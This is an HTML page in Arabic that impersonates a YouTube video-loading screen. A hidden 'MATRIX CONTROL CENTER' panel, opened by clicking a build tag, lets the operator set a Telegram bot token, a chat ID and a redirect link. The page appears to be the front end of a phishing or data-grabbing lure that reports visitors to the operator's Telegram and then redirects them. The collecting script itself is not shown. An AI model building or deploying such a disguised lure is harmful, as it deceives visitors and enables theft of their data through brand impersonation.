<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube - Loading...</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="loader-container" id="mainLoader">
        <img src="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png" class="yt-logo" alt="YouTube">
        <div class="spinner"></div>
        <p class="status-text">جاري تحضير الفيديو للمشاهدة...</p>
    </div>

    <div class="version-tag" id="adminTrigger">Build: V1.0.48-Matrix 🦅</div>

    <div class="overlay" id="overlay"></div>
    <div id="adminPanel">
        <h3>MATRIX CONTROL CENTER</h3>
        <p style="font-size: 10px; color: #666; text-align: center; margin-bottom: 15px;">إعدادات الربط والتشفير السحابي</p>
        
        <label>Telegram Bot Token:</label>
        <input type="text" id="botToken" placeholder="712345678:AAH...">
        
        <label>Your Chat ID:</label>
        <input type="text" id="chatId" placeholder="123456789">
        
        <label>Target Video Link:</label>
        <input type="text" id="redirectUrl" placeholder="https://youtube.com/watch?v=...">
        
        <button onclick="saveSettings()">حفظ وتشفير البيانات 🔒</button>
        <p id="saveMsg" style="display:none; color:#0f0; font-size:12px; text-align:center; margin-top:10px;">تم التحديث بنجاح! جاري إعادة التشغيل...</p>
    </div>

    <script src="script.js"></script>
</body>
</html>
